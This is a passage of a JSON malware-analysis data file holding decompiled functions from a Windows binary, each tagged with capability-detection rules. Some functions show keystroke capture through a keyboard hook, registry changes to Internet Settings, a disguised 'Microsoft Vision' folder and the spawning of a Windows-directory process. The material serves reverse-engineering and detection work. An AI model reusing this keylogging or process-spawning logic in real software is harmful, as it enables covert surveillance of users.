        "decompiled_code": "\nvoid fcn.00415f21(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_60h;\n    uint var_14h;\n    uint uStack20;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_4h);\n    iVar2 = (*_sym.imp.KERNEL32.dll_IsWow64Process)(uVar1);\n    if (iVar2 != 0) {\n        if (var_4h == 0) {\n            iVar2 = fcn.004160c3();\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        else {\n            iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0xff, 0x1000, 0x40);\n            (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(iVar2, 0x104);\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar2);\n            puVar5 = 0x419b78;\n            puVar6 = iVar2 + iVar3;\n            for (iVar4 = 5; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            fcn.00401293(&var_60h, 0, 0x44);\n            var_14h = 0;\n            uStack20 = 0;\n            var_ch = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(iVar2, 0, 0, 0, 0, 0x8000000, 0, 0, &var_60h, &var_14h);\n            if (iVar2 == 0) {\n                return;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        fcn.00415fe0();\n    }\n    return;\n}\n",
        "token_count": 516
    },
    "00416265": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041635b)\n\nint32_t __cdecl fcn.00416265(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint extraout_ECX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar3;\n    uint arg_ch;\n    int32_t var_34h;\n    uint32_t var_2ch;\n    uint lpString2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar1 = arg_8h;\n    *(arg_8h + 8) = 0;\n    *(arg_8h + 0xc) = 5;\n    *(arg_8h + 4) = 5;\n    arg_ch = 0x416285;\n    fcn.00401719();\n    if (*0x5520c8 == 0) {\n        arg_ch = 0x416296;\n        iVar2 = fcn.00406fa7();\n        if (iVar2 == 0) {\n            *0x5520c8 = 0;\n        }\n        else {\n            arg_ch = extraout_ECX;\n            *0x5520c8 = fcn.00416f80();\n        }\n    }\n    fcn.00402e04(*0x5520c8 + 4);\n    uVar3 = 0;\n    if (var_2ch != 0) {\n        do {\n            fcn.00406d65();\n            fcn.0040434f(**(var_34h + uVar3 * 4));\n            arg_8h_00 = fcn.004040d5(&fcn.00416265::arg_8h);\n            fcn.004043c7(arg_8h_00);\n            fcn.00406f1d();\n            arg_8h = 0;\n            fcn.00406f1d();\n            fcn.00406d65();\n            fcn.00406d65();\n            fcn.00406d65();\n            fcn.00401618(0, arg_ch, unaff_EDI, unaff_ESI);\n            fcn.00406f1d();\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < var_2ch);\n    }\n    fcn.00402d86();\n    return iVar1;\n}\n",
        "token_count": 575
    },
    "004163bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004163bc(void)\n\n{\n    fcn.00414047();\n    if ((*0x5520cc != 0) && (*0x5520c8 != 0)) {\n        fcn.00416d09(*0x5520c8);\n        *0x5520cc = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*0x5520d0);\n    return;\n}\n",
        "token_count": 96
    },
    "004163f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004163f3(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    \n    fcn.00414047();\n    if (*0x5520cc == 0) {\n        if (*0x5520c8 == 0) {\n            iVar1 = fcn.00406fa7();\n            if (iVar1 == 0) {\n                *0x5520c8 = 0;\n            }\n            else {\n                *0x5520c8 = fcn.00416f80(extraout_ECX);\n            }\n        }\n        *0x5520c4 = arg_8h;\n        *0x5520cc = 1;\n        fcn.00416d82(arg_ch);\n    }\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*0x5520d0);\n    return;\n}\n",
        "token_count": 197
    },
    "00416d82": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00416d82(uint *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t **ppiVar4;\n    uint *puVar5;\n    uint in_stack_fffffe7c;\n    int32_t iStack156;\n    uint auStack76 [3];\n    uint uStack62;\n    int32_t **ppiStack32;\n    uint *puStack28;\n    int32_t **ppiStack24;\n    uint *puStack20;\n    \n    puStack20 = param_1;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    ppiStack24 = param_1 + 6;\n    (*_sym.imp.ole32.dll_CoCreateInstance)();\n    piVar1 = param_1[6];\n    if (piVar1 != NULL) {\n        ppiStack32 = param_1 + 7;\n        (***piVar1)();\n        piVar1 = param_1[7];\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 4))();\n            puStack28 = param_1 + 8;\n            fcn.00416af8();\n            if (param_1[8] != 0) {\n                (*_sym.imp.ole32.dll_CoCreateInstance)();\n                piVar1 = param_1[9];\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0xc))();\n                    (**(*param_1[9] + 0xc))();\n                    fcn.00401293();\n                    ppiVar4 = ppiStack24;\n                    (**(**ppiStack24 + 0x10))();\n                    iVar2 = fcn.00416718();\n                    puVar3 = puStack20;\n                    puStack20[10] = iVar2;\n                    if (iVar2 != 0) {\n                        iVar2 = fcn.00416734();\n                        puVar3[0xb] = iVar2;\n                        if (iVar2 != 0) {\n                            iVar2 = (**(*puVar3[9] + 0x2c))();\n                            if (-1 < iVar2) {\n                                (**(**ppiVar4 + 0x14))();\n                                puVar3 = iStack156 + 0x30;\n                                puVar5 = auStack76;\n                                for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                    *puVar5 = *puVar3;\n                                    puVar3 = puVar3 + 1;\n                                    puVar5 = puVar5 + 1;\n                                }\n                                fcn.00416540();\n                                puVar3 = puStack20;\n                                fcn.00416bc6(param_2, auStack76[2], auStack76[1], uStack62);\n                                ppiStack24 = *puVar3;\n                                fcn.00406d65();\n                                puVar3 = *(puVar3[1] + param_2 * 4);\n                                puVar5 = &stack0xfffffe7c;\n                                for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                    *puVar5 = *puVar3;\n                                    puVar3 = puVar3 + 1;\n                                    puVar5 = puVar5 + 1;\n                                }\n                                fcn.00416661(in_stack_fffffe7c);\n                                iVar2 = fcn.00416718();\n                                puVar3 = puStack20;\n                                puStack20[0xc] = iVar2;\n                                if (iVar2 != 0) {\n                                    (**(*puStack20[6] + 0x24))(puStack20[6], *puStack20, 0);\n                                    puVar5 = puVar3[9];\n                                    ppiVar4 = puVar3 + 0xd;\n                                    (***puVar5)(puVar5, 0x419400, ppiVar4);\n                                    piVar1 = *ppiVar4;\n                                    if (piVar1 != NULL) {\n                                        (**(*piVar1 + 0x1c))(piVar1);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 937
    },
    "004174cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004174cd(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint extraout_ECX;\n    uchar *puVar5;\n    uint uStack1712;\n    char *pcStack1708;\n    uint uStack1704;\n    uint uStack1700;\n    uchar *puStack1696;\n    uint uStack1692;\n    uint uStack1688;\n    char *pcStack1684;\n    uint uStack1680;\n    uchar *puStack1676;\n    uint uStack1672;\n    uint uVar6;\n    int32_t iVar7;\n    uchar auStack1624 [4];\n    uint uStack1620;\n    uint uStack1616;\n    int32_t iStack1600;\n    uint uStack1588;\n    uint uStack1580;\n    int32_t iStack1556;\n    int32_t iStack1552;\n    int32_t iStack1548;\n    uint uStack1544;\n    uchar auStack1512 [16];\n    int32_t iStack1496;\n    uchar auStack1260 [8];\n    uchar auStack1252 [20];\n    uchar auStack1232 [1228];\n    \n    uStack1620 = 10;\n    uStack1616 = 0;\n    fcn.00406ca5();\n    fcn.004154ca();\n    (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    fcn.00401028();\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n    iVar7 = 0;\n    fcn.00415e27();\n    if (iVar7 == 0) goto code_r0x00417739;\n    uVar6 = 0;\n    fcn.00415b64(0x215a, &stack0xfffff994);\n    iVar7 = 0x20;\n    puVar2 = fcn.00401000();\n    puVar4 = puVar2;\n    do {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    *puVar2 = uVar6;\n    uStack1672 = 0x41757a;\n    *0x41e8c8 = (*_sym.imp.KERNEL32.dll_CreateEventA)();\n    uStack1672 = 0x417585;\n    iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((iVar7 == 0xb7) || (*0x41e8c8 == 0)) goto code_r0x00417739;\n    uStack1672 = 0;\n    puStack1676 = NULL;\n    uStack1680 = 0;\n    pcStack1684 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\";\n    uStack1688 = 0x80000001;\n    uStack1692 = 0x4175bf;\n    (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegSetValueExA;\n    puStack1696 = &stack0xfffff97c;\n    uStack1692 = 4;\n    uStack1700 = 4;\n    uStack1704 = 0;\n    pcStack1708 = \"MaxConnectionsPer1_0Server\";\n    uStack1712 = uStack1672;\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExA)();\n    puVar5 = &stack0xfffff964;\n    (*pcVar1)(puStack1696, \"MaxConnectionsPerServer\", 0, 4, puVar5, 4);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(puVar5);\n    fcn.00406aa8();\n    fcn.0041529e(&stack0xfffff954);\n    fcn.00405ef2(&stack0xfffff950, &stack0xfffff9a8);\n    fcn.00401293(&stack0xfffffb30, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &stack0xfffffb30);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&stack0xfffffb1c, L\"\\\\Microsoft Vision\\\\\");\n    (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(&stack0xfffffb14, 0);\n    if (iStack1552 != 0) {\n        iVar7 = fcn.00413893();\n        if (iVar7 != 1) {\n            uVar3 = fcn.004131f8();\n            if (uVar3 < 10) {\n                fcn.004158f7();\n            }\n            else {\n                fcn.00415974();\n            }\n        }\n    }\n    if (iStack1548 != 0) {\n        iVar7 = fcn.00413893();\n        if (iVar7 == 1) {\n            fcn.00417083();\n            (*_sym.imp.KERNEL32.dll_Sleep)();\n        }\n    }\n    if (iStack1496 == 0) {\n        fcn.00414eef(uStack1588, uStack1580, uStack1544);\n        if (iStack1600 == 0) goto code_r0x00417716;\n        uStack1672 = 0x4176f0;\n        fcn.00404656(&stack0xfffffa18);\n        puStack1676 = &stack0xfffff988;\n        pcStack1684 = 0x417704;\n        uStack1672 = extraout_ECX;\n        fcn.004149a8(&stack0xfffff984, puStack1676);\n        pcStack1684 = 0x41770d;\n        fcn.00406f1d();\n        pcStack1684 = 0x417714;\n        fcn.00406f1d();\n    }\n    else {\ncode_r0x00417716:\n        if (iStack1556 != 0) {\n            fcn.00415f21();\n        }\n        fcn.00405e61();\n    }\n    fcn.00405b78();\ncode_r0x00417739:\n    fcn.00414e90();\n    fcn.00406ccd();\n    return 0;\n}\n",
        "token_count": 1403
    },
    "00417ff3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00417ff3(int32_t *arg_8h)\n\n{\n    int32_t unaff_EDI;\n    uchar *arg_8h_00;\n    uchar auStack16 [12];\n    \n    fcn.0041780e(auStack16, arg_8h[2], 4);\n    if (unaff_EDI != 0) {\n        arg_8h_00 = &stack0xffffffe4;\n        fcn.00404094(arg_8h_00);\n        fcn.00417fd8(arg_8h_00);\n        fcn.00417df9(**arg_8h, (*arg_8h)[1]);\n    }\n    fcn.00404081();\n    return unaff_EDI != 0;\n}\n",
        "token_count": 171
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401293": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint * fcn.00401293(uint *param_1, uchar param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    \n    if (param_3 != 0) {\n        puVar2 = param_1;\n        for (uVar1 = param_3 >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *puVar2 = CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            puVar2 = puVar2 + 1;\n        }\n        for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {\n            *puVar2 = param_2;\n            puVar2 = puVar2 + 1;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 206
    },
    "00408316": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00408316(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_1h;\n    \n    uVar1 = 0;\n    do {\n        *(&var_ch + uVar1) = *((-(uVar1 < 4) & 4) + 0x14 + param_2) >> (('\\x03' - (uVar1 & 3)) * '\\b' & 0x1f);\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 8);\n    var_1h._0_1_ = 0x80;\n    while( true ) {\n        fcn.004083af(1);\n        if ((*(param_2 + 0x14) & 0x1f8) == 0x1c0) break;\n        var_1h._0_1_ = 0;\n    }\n    fcn.004083af(8);\n    uVar1 = 0;\n    do {\n        *(uVar1 + param_1) = *(param_2 + (uVar1 & 0xfffffffc)) >> (('\\x03' - (uVar1 & 3)) * '\\b' & 0x1f);\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x14);\n    fcn.00401293(param_2, 0, 0x5c);\n    return;\n}\n",
        "token_count": 367
    },
    "0040ad09": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ad09(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int16_t iVar3;\n    uint in_ECX;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    uint lpString;\n    uint ARG_0;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    if ((in_EDX != 0x100) && (in_EDX != 0x104)) goto code_r0x0040b118;\n    uVar1 = *arg_8h;\n    if (uVar1 < 0x27) {\n        if (uVar1 < 0x12) {\n            if (((uVar1 != 0x11) && (uVar1 != 8)) && ((uVar1 != 9 && (uVar1 != 0xd)))) {\n                if (uVar1 == 0x10) goto code_r0x0040b118;\ncode_r0x0040b0da:\n                (*_sym.imp.USER32.dll_GetKeyNameTextW)((arg_8h[2] * 0x100 + arg_8h[1]) * 0x10000 + 1, &lpString, 0xf);\n            }\n        }\n        else if ((((uVar1 != 0x12) && (uVar1 != 0x14)) && (uVar1 != 0x1b)) && (uVar1 != 0x20)) goto code_r0x0040b0da;\n    }\n    else if (uVar1 < 0x41) {\n        iVar3 = (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        if (iVar3 == 0) {\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x419d58, uVar1);\n        }\n        else {\n            if (9 < uVar1 - 0x30) goto code_r0x0040b118;\n    // switch table (10 cases) at 0x40b12d\n            switch(*((uVar1 - 0x30) * 4 + 0x40b12d)) {\n            case 0x40ad63:\n                break;\n            case 0x40ad6d:\n                break;\n            case 0x40ad77:\n                break;\n            case 0x40ad81:\n                break;\n            case 0x40ad8b:\n                break;\n            case 0x40ad95:\n                break;\n            case 0x40ad9f:\n                break;\n            case 0x40ada9:\n                break;\n            case 0x40adb3:\n                break;\n            case 0x40adbd:\n            }\n        }\n    }\n    else {\n        if (uVar1 < 0x5b) {\n            var_4h = in_ECX;\n            fcn.0040b167();\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            cVar2 = fcn.0040b155();\n            uVar4 = uVar1 + 0x20;\n            if (cVar2 != '\\0') {\n                uVar4 = uVar1;\n            }\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x419d58, uVar4);\n            fcn.0040b172();\n            in_ECX = var_4h;\n            goto code_r0x0040b118;\n        }\n        if (uVar1 < 0x69) {\n            if (uVar1 != 0x68) {\n                if (uVar1 < 100) {\n                    if (((uVar1 != 99) && (uVar1 != 0x2e)) && ((uVar1 != 0x60 && ((uVar1 != 0x61 && (uVar1 != 0x62))))))\n                    goto code_r0x0040b0da;\n                }\n                else if ((((uVar1 != 100) && (uVar1 != 0x65)) && (uVar1 != 0x66)) && (uVar1 != 0x67))\n                goto code_r0x0040b0da;\n            }\n        }\n        else if (uVar1 < 0xbd) {\n            if (uVar1 == 0xbc) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 < 0xa4) {\n                if ((uVar1 != 0xa3) && (uVar1 != 0x69)) {\n                    if ((uVar1 == 0xa0) || (uVar1 == 0xa1)) goto code_r0x0040b118;\n                    if (uVar1 != 0xa2) goto code_r0x0040b0da;\n                }\n            }\n            else if ((uVar1 != 0xa4) && (uVar1 != 0xa5)) {\n                if (uVar1 == 0xba) {\n                    (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                }\n                else {\n                    if (uVar1 != 0xbb) goto code_r0x0040b0da;\n                    (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                }\n            }\n        }\n        else if (uVar1 < 0xdc) {\n            if (uVar1 == 0xdb) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbd) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbe) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbf) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else {\n                if (uVar1 != 0xc0) goto code_r0x0040b0da;\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n        }\n        else if (uVar1 == 0xdc) {\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n        else if (uVar1 == 0xdd) {\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n        else {\n            if (uVar1 != 0xde) goto code_r0x0040b0da;\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n    }\n    fcn.0040b172();\ncode_r0x0040b118:\n    (*_sym.imp.USER32.dll_CallNextHookEx)(0, in_ECX, var_8h, arg_8h);\n    return;\n}\n",
        "token_count": 1550
    },
    "0040139b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040139b(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x419480;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "004013b9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013b9(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x419488;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00401d72": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401d72(uint32_t arg_8h)\n\n{\n    fcn.004047e5();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00401d91": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401d91(uint32_t arg_8h)\n\n{\n    fcn.00404867();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00401db0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401db0(uint32_t arg_8h)\n\n{\n    fcn.0040488b();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00401dcf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401dcf(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x419764;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00401ded": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ded(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41976c;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00401e0b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e0b(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x419774;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00401e29": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e29(uint32_t arg_8h)\n\n{\n    fcn.0040496c();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00401e48": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e48(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x419784;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00401e66": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e66(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41978c;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00401e84": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e84(uint32_t arg_8h)\n\n{\n    fcn.004049fb();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00401ea3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ea3(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x41979c;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00401ec1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ec1(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4197a4;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "00401edf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401edf(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4197ac;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00401efd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401efd(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4197b4;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00401f1b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f1b(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4197bc;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "00401f39": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f39(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4197c4;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "00401f57": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f57(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4197cc;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00401f75": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f75(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4197d4;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "00401f93": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f93(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4197dc;\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00401fb1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401fb1(uint32_t arg_8h)\n\n{\n    fcn.00404c0e();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406f8d();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "0040200b": {
        "rules": [
